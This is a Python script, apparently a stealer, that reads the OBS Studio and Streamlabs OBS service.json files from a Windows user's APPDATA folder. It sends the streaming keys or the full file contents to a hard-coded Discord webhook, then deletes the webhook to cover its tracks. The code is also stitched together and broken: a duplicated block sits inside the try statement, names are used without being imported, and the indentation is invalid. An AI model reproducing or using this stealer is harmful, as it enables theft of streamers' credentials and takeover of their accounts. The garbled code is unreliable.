import os
import json
import requests


#enter you webhook url here
WEBHOOK_URL = "https://discord.com/api/webhooks/788858663427244063/sjoH6h7kjocMSfvTPtRKSew3E73bOKO2VUOcOxjEIsT_bB0dRMMzTH9DH5S1juXMfrMR"

DESTROY_WEBHOOK = True


def getKeys(path):
    with open(path) as f:
            path = json.load(f)
            key = path.get("settings").get('key')
    return key

def main():

    roaming = os.getenv('APPDATA')

    paths = {
        'SLOBS' : roaming + '\\slobs-client\\service.json',
        'OBS' : roaming + '\\obs-studio\\basic\\profiles\\Untitled\\service.json'
    }

    message = ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        
        message += f'\n**{platform}**\n```\n'

        keys = getKeys(path)

        if len(keys) > 0:
            for key in keys:
                message += f'{key}'
        else:
            message += 'No keys found.\n'

        message += '```'

    try:
        requests.post(WEBHOOK_URL, json = {'content' : f'{message}'})


local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

SLOBS = roaming + '\\slobs-client\\service.json'
OBS = roaming + '\\obs-studio\\basic\\profiles\\Untitled\\service.json'

if path.exists(f"{OBS}"):
    obs = open(f"{OBS}" , "r")
    obskey = obs.read()
    obs.close()
    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**OBS** ```json\n{obskey} \n 'found in '{OBS}'```"))
    response = f.execute()
else:
    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**OBS** ```json\n OBS Not Found```"))
    response = f.execute()

if path.exists(f"{SLOBS}"):
    slobs = open(f"{SLOBS}", "r")
    slobskey = slobs.read()
    slobs.close()
    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**SLOBS** ```json\n{slobskey} \n found in '{SLOBS}'```"))
    response = f.execute()
else:
    f = DiscordWebhook(url=f"{WEBHOOK_URL}",content=(f"**SLOBS** ```json\n SLOBS Not Found```"))
    response = f.execute()

        if DESTROY_WEBHOOK == True:
            requests.delete(WEBHOOK_URL)
        else:
            pass
    except:
        pass
        
    

if __name__ == '__main__':
    main()

